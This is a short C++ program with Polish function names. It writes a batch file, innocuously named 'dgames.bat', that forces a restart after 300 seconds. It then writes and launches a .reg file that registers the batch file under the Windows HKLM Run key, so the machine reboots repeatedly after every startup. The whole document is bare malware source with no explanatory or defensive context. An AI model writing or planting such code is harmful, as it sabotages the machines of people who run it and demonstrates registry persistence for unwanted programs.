#include<iostream>
#include<fstream>
using namespace std;
void plik_bat();
void plik_reg();
void uruchomienie();     
               
                   
int main()
{
    plik_bat();  
    plik_reg(); 
    uruchomienie();
    return 0;
}

void plik_bat()
{
    fstream plik("c:\\dgames.bat",ios::out);  
    plik<<"shutdown.exe -r -t 300";  
    plik.close();
}
void plik_reg()
{
     fstream plik("c:\\rejestr.reg",ios::out);
     plik<<"REGEDIT\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run] \"dgames\"=\"\\\"c:\\\\dgames.bat\\\"\"";
     plik.close();
}
void uruchomienie()
{
     system("start c:\\rejestr.reg");     
}
